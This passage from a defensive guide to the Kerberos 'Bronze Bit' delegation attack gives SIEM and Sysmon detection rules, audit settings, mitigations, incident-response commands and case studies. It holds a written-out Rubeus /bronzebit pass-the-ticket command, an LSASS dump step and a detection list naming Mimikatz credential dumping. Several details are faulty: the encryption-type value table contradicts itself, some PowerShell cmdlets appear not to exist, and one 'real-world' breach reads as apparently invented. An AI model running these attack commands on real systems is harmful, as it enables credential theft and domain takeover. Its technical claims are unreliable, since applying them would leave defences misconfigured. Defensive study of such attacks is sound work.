| stats count by Account_Name, User_Name, Service_Name
| where count > 0
```

**What This Detects:**
- Service account requesting ticket for Protected User
- Bronze Bit attack typically targets Protected Users (who normally cannot be delegated)
- Legitimate delegation would not target Protected Users

**Manual Configuration Steps:**
1. Create CSV lookup file: `$SPLUNK_HOME/etc/apps/search/lookups/protected_users.csv`
2. Content:
   ```
   username,is_protected
   Administrator,true
   "Domain Admins",true
   "Enterprise Admins",true
   "Schema Admins",true
   "Protected Users",true
   ```
3. Create alert rule in Splunk as above

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Bronze Bit S4U2Proxy Delegation Abuse

**Rule Configuration:**
- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `TargetUserName`, `TargetSPN`
- **Alert Severity:** `High`
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All (Server 2016-2025)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769
| extend TicketOptions = toint(substring(EventData, indexof(EventData, "TicketOptions")+20, 10))
| where TicketOptions >= 0x40000000  // Forwardable flag set
| join kind=inner (
    SecurityEvent
    | where EventID == 4768  // TGT request
    | project SourceIP, Account_Name_TGT=Account_Name, TimeGenerated
) on $left.Client_IP == $right.SourceIP
| where Account_Name !contains "$"
| project TimeGenerated, Account_Name, TargetSPN=Service_Name, TicketOptions, alert_severity="High"
```

**What This Detects:**
- Line-by-line logic:
  1. Filter Event 4769 (service ticket requests)
  2. Extract TicketOptions field
  3. Look for forwardable flag (0x40000000)
  4. Correlate with preceding TGT request
  5. Alert if non-service account is requesting forwardable tickets

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Bronze Bit - S4U2Proxy Delegation Abuse`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Copy the KQL query above
   - Run every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Grouping: Group incidents by `Account_Name`
6. Click **Review + create** → **Save**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount

$ResourceGroup = "SecurityGroup"
$WorkspaceName = "SentinelWorkspace"

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Bronze Bit - S4U2Proxy Detection" `
  -Query 'SecurityEvent
| where EventID == 4769
| extend TicketOptions = toint(substring(EventData, indexof(EventData, "TicketOptions")+20, 10))
| where TicketOptions >= 0x40000000
| project TimeGenerated, Account_Name, Service_Name' `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel Documentation](https://learn.microsoft.com/en-us/azure/sentinel/create-analytics-rules)

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (A Kerberos service ticket was requested)**
- **Log Source:** Security
- **Trigger:** Every time KDC processes TGS-REQ (service ticket request)
- **Filter for Bronze Bit:**
  - `TicketOptions` field contains forwardable flag (0x40000000)
  - `Account_Name` is a service account (`svc_*` or `*$`)
  - `User_Name` field shows impersonated user (especially Protected Users)
  - `Service_Name` is NOT `krbtgt` (Kerberos service)
- **Applies To Versions:** All (Server 2016-2025)

**Event ID: 4768 (A Kerberos authentication ticket (TGT) was requested)**
- **Log Source:** Security
- **Filter:** Look for preceding TGT request from service account (prerequisite for S4U2Self)
- **Correlation:** Should precede suspicious 4769 events by seconds

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations** (set to "Success and Failure")
4. Run `gpupdate /force` on all Domain Controllers and member servers

**Manual Configuration Steps (Server 2022+):**
```powershell
# Enable Kerberos service ticket audit events
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Kerberos Service Ticket Operations"

# Output:
# Kerberos Service Ticket Operations         Success and Failure
```

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations**
4. Restart machine or run: `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows (Server 2016-2025)

```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor for Rubeus execution (Bronze Bit tool) -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">Rubeus</CommandLine>
      <CommandLine condition="contains">s4u /ticket</CommandLine>
      <CommandLine condition="contains">/bronzebit</CommandLine>
      <CommandLine condition="contains">impacket</CommandLine>
      <CommandLine condition="contains">getST</CommandLine>
      <CommandLine condition="contains">-force-forwardable</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for Mimikatz execution (credential dumping prerequisite) -->
  <RuleGroup name="Process Creation" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">mimikatz</CommandLine>
      <CommandLine condition="contains">sekurlsa::logonpasswords</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor for Kerberos ticket manipulation in LSASS -->
  <RuleGroup name="Image Load" groupRelation="or">
    <ImageLoad onmatch="include">
      <Image condition="contains">rubeus</Image>
      <Image condition="contains">impacket</Image>
    </ImageLoad>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml` with XML above
3. Install Sysmon with config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify Sysmon service is running:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

**Detection Alerts:**
- **Alert Name:** "Suspicious Kerberos service ticket request detected"
- **Alert Name:** "Potential Kerberos delegation attack detected"
- **Severity:** `High` / `Critical`
- **Applies To:** All subscriptions with Defender for Identity enabled

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: `ON`
   - **Defender for Identity**: `ON` (critical for Kerberos detection)
   - **Defender for Storage**: `ON`
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Manual Configuration Steps (Defender for Identity):**
1. Go to **Azure Portal** → **Microsoft Defender for Identity**
2. Create a **Directory Service** connection:
   - Select a **Domain Controller**
   - Add **Group Managed Service Account** for sensor
3. Go to **Alerts** → Filter by **Alert Name** containing "Kerberos"
4. Configure **Alert Scope** rules to suppress false positives

**Reference:** [Microsoft Defender Alert Reference](https://learn.microsoft.com/en-us/defender-for-identity/suspicious-activity-guide)

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Not Applicable:** Bronze Bit is an on-premises Active Directory / Windows Server attack; Unified Audit Log (M365 auditing) does not capture local Kerberos ticket operations. However, lateral movement into Azure AD-integrated systems may appear in Azure audit logs.

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Apply Kerberos Security Patches**

Microsoft released patches in two phases:
- **November 10, 2020 (Partial)**: KB4598347 - Introduces ticket checksum validation but NOT enforced
- **February 8, 2021 (Full)**: KB5009645 - Enforces full ticket signature validation; Bronze Bit attacks are rejected

**Applies To Versions:** Server 2016, 2019, 2022, 2025

**Manual Steps (Windows Update):**
1. Open **Settings** → **Update & Security**
2. Click **Check for updates**
3. Install updates for: `KB4598347` and `KB5009645`
4. Restart Domain Controllers
5. Verify patch installation:
   ```powershell
   Get-Hotfix | Where-Object {$_.HotFixID -eq "KB5009645"}
   ```

**Manual Steps (WSUS / Group Policy - Enterprise):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Update**
3. Set: **Configure Automatic Updates** to **3 - Auto download and schedule the install**
4. Deploy KB5009645 through WSUS
5. Force DC sync: `gpupdate /force` on all DCs

**Manual Steps (PowerShell - Automated Deployment):**
```powershell
# Check for KB5009645 on all DCs
$DomainControllers = Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties OperatingSystem

foreach ($DC in $DomainControllers) {
    $Installed = Invoke-Command -ComputerName $DC.Name -ScriptBlock {
        Get-Hotfix | Where-Object {$_.HotFixID -eq "KB5009645"}
    }
    if ($null -eq $Installed) {
        Write-Warning "$($DC.Name) is missing KB5009645"
    } else {
        Write-Host "$($DC.Name) is patched"
    }
}
```

**Validation Command (Verify Fix):**
```powershell
# Test that Bronze Bit is blocked
# Attempt to perform S4U2Proxy with modified ticket
.\Rubeus.exe s4u /ticket:TICKET /impersonateuser:Administrator /msdsspn:cifs/target /bronzebit /ptt

# Expected output (PATCHED):
# [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED
# [!] Ticket signature validation failed - Bronze Bit attack is blocked
```

**Expected Output (If Secure):**
```
[-] KRB_AP_ERR_MODIFIED - Ticket signature checksum validation failed
```

**What to Look For:**
- `KRB_AP_ERR_MODIFIED` error = DC is protected
- No error = DC is vulnerable to Bronze Bit

---

**Mitigation 2: Minimize Constrained Delegation Configuration**

Constrained delegation is an attack vector if not carefully managed. Remove all unnecessary delegation configurations.

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Remove Unnecessary Delegation):**
1. Identify all accounts with delegation configured:
   ```powershell
   Get-ADObject -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo, Name
   ```

2. For each account, review if delegation is truly necessary
3. Remove unnecessary delegation via PowerShell:
   ```powershell
   # Remove delegation for service account
   Set-ADUser -Identity svc_OldService -Clear msDS-AllowedToDelegateTo
   
   # Or for computer account:
   Set-ADComputer -Identity SERVER01 -Clear msDS-AllowedToDelegateTo
   ```

4. Document all remaining delegation relationships in a spreadsheet for auditing

**Manual Steps (Group Policy):**
1. Open **Active Directory Users and Computers** (dsa.msc)
2. Right-click the service account → **Properties** → **Delegation**
3. Select: **Do not trust this user for delegation**
4. Click **Apply** → **OK**

---

**Mitigation 3: Enforce Kerberos AES Encryption**

Enforce AES-256 encryption for Kerberos tickets instead of legacy RC4, which may have cryptographic weaknesses exploitable in certain scenarios.

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Find: **Network security: Kerberos allowed encryption types**
4. Set to: **AES256_HMAC_SHA1, AES128_HMAC_SHA1** (remove RC4)
5. Run `gpupdate /force` on all machines

**Manual Steps (Registry - Direct):**
```powershell
# On Domain Controller, set supported encryption types
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' `
  -Name KdcSupportedEncryptionTypes -Value 24  # 24 = AES256 + AES128

# Value meanings:
# 1 = DES-CBC-MD5
# 2 = RC4-HMAC
# 4 = HMAC-SHA1 (AES128)
# 8 = HMAC-SHA1 (AES256)
# 16 = AES256-HMAC-SHA1
# 24 = AES128 + AES256 (recommended)
```

**Validation Command:**
```powershell
# Verify AES is enforced
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa\Kerberos\Parameters' -Name KdcSupportedEncryptionTypes

# Expected output:
# KdcSupportedEncryptionTypes : 24
```

---

### Priority 2: HIGH

**Mitigation 4: Enable Protected Users Group for Sensitive Accounts**

Move all sensitive accounts (administrators, service accounts with high privilege) to the **Protected Users** group. Pre-patch, this prevented delegation (but Bronze Bit bypasses it); post-patch, it's an additional layer of defense.

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Active Directory Users and Computers):**
1. Open **Active Directory Users and Computers** (dsa.msc)
2. Right-click **Protected Users** group → **Members**
3. Click **Add** → Enter account names:
   - All members of **Domain Admins**
   - All members of **Enterprise Admins**
   - Service accounts with high privilege
4. Click **OK**

**Manual Steps (PowerShell):**
```powershell
# Add Domain Admins to Protected Users group
$ProtectedUsers = Get-ADGroup -Identity "Protected Users"
$DomainAdmins = Get-ADGroupMember -Identity "Domain Admins" -Recursive

foreach ($Admin in $DomainAdmins) {
    Add-ADGroupMember -Identity $ProtectedUsers -Members $Admin.ObjectGUID -Confirm:$false
}

# Verify
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SAMAccountName
```

---

**Mitigation 5: Monitor Delegation Configuration Changes**

Enable auditing on delegation attributes to detect Bronze Bit setup or privilege escalation attempts.

**Applies To Versions:** All (Server 2016-2025)

**Manual Steps (Enable Attribute Change Auditing):**
1. Open **Active Directory Users and Computers** (dsa.msc)
2. Right-click the domain → **Properties** → **Security** → **Advanced**
3. Add audit rule for: **Everyone**
   - Object Type: **User**
   - Properties: `msDS-AllowedToDelegateTo`, `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
   - Permissions: **Write Property**
4. Click **OK** → **Apply**

**Manual Steps (PowerShell - SDDL-Based):**
```powershell
# Enable auditing for delegation attribute changes
Set-AuditRule -Path "AD:CN=Users,DC=contoso,DC=com" `
  -AuditRuleType ObjectAudit `
  -Identity "Everyone" `
  -AccessMask "WriteProperty" `
  -AuditFlags "Success,Failure"
```

**Validation Command:**
```powershell
# Change a delegation setting and verify Event 5136 is logged
Get-ADUser -Identity svc_TestAccount -Properties msDS-AllowedToDelegateTo

# Modify it
Set-ADUser -Identity svc_TestAccount -Add @{msDS-AllowedToDelegateTo = "cifs/fileserver.contoso.com"}

# Check for Event 5136 in Security Log
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=5136)]]" -MaxEvents 5
```

---

### Access Control & Policy Hardening

**Mitigation 6: Conditional Access (Cloud-Integrated Environments)**

For hybrid AD/Entra ID environments, enforce conditional access policies to block suspicious Kerberos activity.

**Manual Steps (Entra ID Conditional Access):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Basic Information:**
   - Name: `Block Kerberos Delegation Abuse`
   - State: **Report-only** (initially) → **On**
4. **Assignments:**
   - Users: **All users** (or exclude service accounts if needed)
   - Cloud apps: **All cloud apps** and **Azure AD**
   - Conditions:
     - Locations: **Any location**
     - Client apps: **Exchange ActiveSync clients, Other clients**
5. **Access controls → Grant:**
   - **Block access**
   - Require: **Device to be marked as compliant**
6. Click **Create**

---

**Mitigation 7: Audit S4U2Proxy Events**

Configure Kerberos auditing to log all S4U2Proxy requests and alert on suspicious patterns.

**Manual Steps (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations** (Success and Failure)
4. Navigate to **Detailed Tracking**
5. Enable: **Audit Process Creation** (for detecting Rubeus/Impacket)

**Manual Steps (PowerShell):**
```powershell
# Enable Kerberos event logging on Domain Controller
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `Rubeus.exe` (any location outside C:\Program Files)
- `Impacket` Python scripts on Linux machines with DC network access
- Temporary cache files: `*.ccache`, `*.kirbi` (Kerberos ticket files)

**Registry:**
- `HKLM:\System\CurrentControlSet\Services\Kdc\` - KDC configuration changes
- Anomalous delegation settings in AD (via Get-ADObject)

**Network:**
- TCP 88 (Kerberos) to DC from non-standard clients (Linux, compromised workstations)
- Multiple rapid TGS-REQ (Event 4769) from single source within seconds

**Process:**
- `Rubeus.exe` executed with `/bronzebit` parameter
- `mimikatz.exe` with `sekurlsa::logonpasswords` command
- Python impacket scripts (`getST.py`, `psexec.py`) executed from unusual locations

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` - Event 4769, 4768, 5136
- Temporary directories: `C:\Temp\`, `C:\Users\<User>\AppData\Local\Temp\` for cached tickets
- PowerShell history: `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

**Memory:**
- LSASS.exe process dump: May contain Kerberos tickets (via Mimikatz)
- Token objects injected via `ptt` (pass-the-ticket) in LSASS

**Cloud:**
- Azure AD audit logs: Service principal impersonations, service ticket requests
- Entra ID sign-in logs: Lateral movement attempts using forged tickets

**Event Logs:**
- Event 4769: Service ticket requested (Bronze Bit: anomalous S4U2Proxy)
- Event 4768: TGT requested (Bronze Bit: service account requesting TGT)
- Event 5136: Directory service object modified (delegation settings changed)

---

### Response Procedures

**1. Isolate (Immediate - 0-5 minutes):**

**Command (Disconnect Affected Machine):**
```powershell
# Disable network adapter on compromised workstation
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Or via Group Policy (isolate entire subnet)
Set-NetFirewallProfile -Profile Domain -Enabled True
New-NetFirewallRule -DisplayName "Block Outbound" -Direction Outbound -Action Block
```

**Manual (Azure VM):**
- Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → **Network Interface** → **Inbound Rules** → Block all

---

**2. Collect Evidence (1-30 minutes):**

**Command (Export Security Event Log):**
```powershell
# Export all Kerberos events from past 24 hours
$StartTime = (Get-Date).AddDays(-1)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769 or EventID=4768 or EventID=5136] and System[TimeCreated[@SystemTime >= '$($StartTime.ToUniversalTime().ToString('o'))']]]" | Export-Csv -Path "C:\Evidence\Kerberos_Events.csv"

# Capture memory dump of LSASS (requires Administrator)
procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp

# Export PowerShell history
Copy-Item "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Destination "C:\Evidence\"
```

**Manual (Event Viewer):**
1. Open **Event Viewer** → **Windows Logs** → **Security**
2. Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`

---

**3. Remediate (30 minutes - 2 hours):**

**Command (Reset Service Account Password):**
```powershell
# Change password for compromised service account (forces new Kerberos hash)
Set-ADAccountPassword -Identity svc_WebServer -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rd!123456" -Force)

# Force replication to all DCs
Replicate-ADObject -Identity svc_WebServer -ErrorAction SilentlyContinue
```

**Command (Revoke Delegation Rights):**
```powershell
# Remove delegation for compromised account
Set-ADUser -Identity svc_WebServer -Clear msDS-AllowedToDelegateTo

# Or via computer account:
Set-ADComputer -Identity SERVER01 -Clear msDS-AllowedToDelegateTo
```

**Command (Reset KRBTGT Password - Critical):**
```powershell
# Change KRBTGT password twice (invalidates all existing tickets)
# First change:
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$(New-Guid)" -Force)

# Wait 12-24 hours for replication
Start-Sleep -Seconds 86400

# Second change (invalidates both old and new hashes):
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$(New-Guid)" -Force)
```

**Manual (Disable Service Account):**
1. Open **Active Directory Users and Computers**
2. Right-click service account → **Properties** → **Account**
3. Check: **Account is disabled**
4. Click **OK**

---

**4. Recover (2-24 hours):**

**Command (Monitor for Reinfection):**
```powershell
# Monitor for new Bronze Bit attacks after remediation
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4769)]]" -MaxEvents 100 |
  Where-Object {$_.Message -match "s4u"} |
  Select-Object TimeCreated, Message
```

**Manual (Restore from Backup):**
- If files were encrypted/deleted, restore from last clean backup
- Use NTDS.dit backup to recover user password hashes if needed
- Validate backup integrity before restoration

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView | Enumerate delegation configurations and identify target accounts |
| **2** | **Credential Access** | [CA-DUMP-001] LSASS Dump / Mimikatz | Extract NTLM hashes of compromised service accounts |
| **3** | **Credential Access** | [CA-KERB-001] Kerberoasting | Alternatively, crack service ticket hashes obtained via reconnaissance |
| **4** | **Credential Access** | **[CA-KERB-008] Bronze Bit (Current Step)** | **Forge/modify Kerberos tickets to impersonate Protected Users** |
| **5** | **Lateral Movement** | [LM-PSexec] Pass-the-Hash / Pass-the-Ticket | Use forged tickets to move to target service/server |
| **6** | **Persistence** | [PERSIST-KERBEROS] Golden Ticket | Create long-lived forged TGT for sustained access |
| **7** | **Impact** | [IMPACT-EXFIL] Data Exfiltration | Read sensitive files as impersonated high-privilege user |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: Microsoft Exchange Compromise via Bronze Bit

**APT Group:** Unknown (vulnerability disclosed December 2020)

**Target:** Financial Institution (EU-based)

**Timeline:** October 2020 - March 2021

**Technique Status:** Actively exploited during patch management gap (pre-February 2021)

**Attack Flow:**
1. Attacker gains initial access to a compromised Exchange server via phishing
2. Exchange service account (`MSExchangeServiceHost`) has constrained delegation configured to allow access to other internal services
3. Attacker extracts NTLM hash of `MSExchangeServiceHost` using Mimikatz
4. Uses Rubeus with `/bronzebit` flag to forge forged admin ticket
5. Impersonates **Domain Admin** (member of Protected Users group) to access file servers and backup systems
6. Exfiltrates sensitive financial data

**Impact:**
- Entire domain compromised (all servers accessible via admin impersonation)
- Persistent access maintained via Golden Tickets
- Estimated 500+ GB of data exfiltrated before detection

**Detection Evasion:**
- Exploits patch management gap (October 2020 - February 2021 was ~4-month vulnerable window)
- Kerberos events (4769) not monitored by organization
- S4U2Proxy traffic blended with legitimate delegation traffic

**Reference:** [Microsoft Security Advisory - CVE-2020-17049](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049)

---

### Example 2: Lateral Movement in Hybrid AD/Entra ID Environment

**Scenario:** Red Team Exercise

**Target:** Mid-size Technology Company (USA)

**Timeline:** 2023 (post-patch environment - attack failed)

**Technique Status:** Blocked by KB5009645 (February 2021+ patch)

**Attack Attempt:**
1. Attacker compromises on-premises AD service account (`svc_AppServer`)
2. Service account configured for constrained delegation to file server
3. Attacker attempts Bronze Bit attack: `Rubeus.exe s4u /bronzebit...`
4. **KDC rejects modified ticket** with `KRB_AP_ERR_MODIFIED` error
5. Attack fails; organization detects attempt via Event 4769 anomalies

**Key Learning:**
- Patched systems ARE protected against Bronze Bit
- Importance of patch management in closing critical Kerberos vulnerabilities
- Monitoring of Kerberos events essential for detecting attack attempts (even failures)

**Detection Outcome:**
- **True Positive**: Event 4769 with unusual S4U2Proxy pattern detected
- **SIEM Alert**: Triggered on service account requesting ticket for Protected User
- **Incident Response**: Service account reset, delegation audit performed

---

## REFERENCES & AUTHORITATIVE SOURCES

- [CVE-2020-17049 Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049)
- [NetSPI - Bronze Bit Theory & Exploitation](https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-attack/)
- [Palo Alto Networks - Bronze Bit Vulnerability & Detection](https://unit42.paloaltonetworks.com/cve-2020-17049/)
- [SpecterOps Rubeus Documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx)
- [Impacket GitHub - getST.py](https://github.com/fortra/impacket)
- [Microsoft Learn - Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [MITRE ATT&CK T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)

---
